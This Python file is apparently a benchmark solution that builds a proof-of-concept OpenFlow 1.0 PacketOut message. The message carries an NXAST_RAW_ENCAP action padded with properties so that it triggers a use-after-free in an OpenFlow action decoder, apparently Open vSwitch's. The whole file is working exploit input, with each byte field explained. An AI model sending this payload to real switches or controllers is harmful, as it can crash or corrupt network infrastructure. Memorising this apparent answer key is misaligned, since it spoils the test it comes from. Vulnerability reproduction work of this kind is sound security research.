import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct an OpenFlow 1.0 PacketOut message that triggers the UAF.
        # The goal is to construct a message of 72 bytes (ground-truth length) containing
        # an NXAST_RAW_ENCAP action. The action properties must be sufficient to fill
        # the initial small buffer (64 bytes) of 'ofpacts' during decoding, causing
        # a reallocation of the buffer while the 'raw_encap' pointer is still in use.

        # 1. Construct Properties (40 bytes)
        # We use 10 properties, each 4 bytes long (Header only, 0 value length).
        # Class 0 (NX_ENCAP_PROP_CLASS_L3), Type 0, Len 4.
        # This fills the buffer efficiently.
        props = b""
        for _ in range(10):
            props += struct.pack(">HBB", 0, 0, 4)

        # 2. Construct NXAST_RAW_ENCAP Action Header (16 bytes)
        # Type: OFPAT_VENDOR (0xffff)
        # Length: 16 (Header) + 40 (Props) = 56
        # Vendor: NX_VENDOR_ID (0x00002320)
        # Subtype: NXAST_RAW_ENCAP (46)
        # Pad: 6 bytes
        # Format: Type(H), Len(H), Vendor(I), Subtype(H), Pad(6x)
        action_header = struct.pack(">HHIH6x", 0xffff, 56, 0x00002320, 46)

        # Combine Action Header and Properties
        actions = action_header + props

        # 3. Construct PacketOut Body (8 bytes)
        # Buffer ID: -1 (OFP_NO_BUFFER)
        # In Port: 0 (OFPP_NONE)
        # Actions Length: 56
        body = struct.pack(">IHH", 0xffffffff, 0, len(actions))

        # 4. Construct OpenFlow Header (8 bytes)
        # Version: 1 (OFP 1.0)
        # Type: 13 (OFPT_PACKET_OUT)
        # Length: 8 (Header) + 8 (Body) + 56 (Actions) = 72
        # XID: 0
        header = struct.pack(">BBHI", 1, 13, 8 + 8 + len(actions), 0)

        # Return the full PoC
        return header + body + actions